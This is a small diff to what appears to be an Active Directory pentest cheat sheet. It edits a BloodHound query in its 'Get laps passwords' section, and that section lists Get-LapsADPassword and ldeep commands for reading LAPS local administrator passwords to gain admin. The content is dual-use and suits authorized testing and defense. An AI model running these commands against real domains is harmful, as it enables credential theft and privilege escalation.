@@ -49,7 +49,7 @@
 
 ## Get laps passwords
 - who can read LAPS
-  - `MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p`
+  - `MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p`
 - Read LAPS >>> Admin
   - `Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize`
   - `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps`
